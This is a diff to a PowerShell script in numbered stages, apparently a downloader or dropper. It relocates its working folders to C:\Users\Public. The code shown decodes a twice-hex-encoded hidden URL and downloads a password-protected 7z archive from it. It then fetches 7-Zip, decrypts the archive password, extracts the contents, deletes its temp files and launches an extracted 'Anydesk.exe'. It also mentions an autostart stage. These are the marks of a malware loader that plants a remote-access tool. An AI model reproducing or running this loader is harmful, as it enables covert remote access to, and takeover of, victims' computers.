@@ -66,9 +66,9 @@ Function Convert-HexToASCII {
 
 # Stage 5: Create temp folder
 Function CreateTempFolder {
-    $tempFolderPath = "S:\downloader\temp"
-    $temp7zFolderPath = "S:\downloader\temp\7zip"
-	$loadPath = "S:\downloader\load"
+    $tempFolderPath = "C:\Users\Public\temp"
+    $temp7zFolderPath = "C:\Users\Public\temp\7zip"
+	$loadPath = "C:\Users\Public\load"
     New-Item -ItemType Directory -Force -Path $tempFolderPath | Out-Null   
     New-Item -ItemType Directory -Force -Path $temp7zFolderPath | Out-Null
 	New-Item -ItemType Directory -Force -Path $loadPath | Out-Null
@@ -96,8 +96,8 @@ Function Download-File {
 Function DownloadAndExtract7Zip {
     $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
     $tempFolderPath = CreateTempFolder
-    $sevenZipDownloadPath = "S:\downloader\temp\7zip\7za.zip"
-    $sevenZipExtractPath = "S:\downloader\temp\7zip"
+    $sevenZipDownloadPath = "C:\Users\Public\temp\7zip\7za.zip"
+    $sevenZipExtractPath = "C:\Users\Public\temp\7zip"
     Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
     Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
     return $sevenZipExtractPath
@@ -131,7 +131,7 @@ Function UnzipFileWith7Zip {
         [string]$outputPath,
         [string]$password
     )
-    S:\downloader\temp\7zip\7za.exe x S:\downloader\temp\DownloadedFile.7z -o"$outputPath" -p"$password"
+    C:\Users\Public\temp\7zip\7za.exe x C:\Users\Public\temp\DownloadedFile.7z -o"$outputPath" -p"$password"
 }
 
 # Stage 11: Setup for autostart not implemented for brevity
@@ -162,13 +162,13 @@ $finalUrl = Convert-HexToASCII -hexString $hexString
 $finalUrl = Convert-HexToASCII -hexString $finalUrl
 $tempFolderPath = CreateTempFolder
 $downloadPath = "$tempFolderPath\DownloadedFile.7z"
-Download-File -url $finalUrl -path S:\downloader\temp\DownloadedFile.7z
+Download-File -url $finalUrl -path C:\Users\Public\temp\DownloadedFile.7z
 DownloadAndExtract7Zip
 $password = Get-DecryptedPassword
 $sevenZipCmdPath = "$sevenZipExtractPath\7za.exe"
-UnzipFileWith7Zip -filePath $downloadPath -outputPath "S:\downloader\load" -password $password
+UnzipFileWith7Zip -filePath $downloadPath -outputPath "C:\Users\Public\load" -password $password
 Cleanup -folderPath $tempFolderPath
-Launch -extractedFilePath "S:\downloader\load\Anydesk.exe"
+Launch -extractedFilePath "C:\Users\Public\load\Anydesk.exe"
 
 # if ($binaryString -ne $null) {
 #     $hexString = Convert-BinaryToHex -binaryString $binaryString
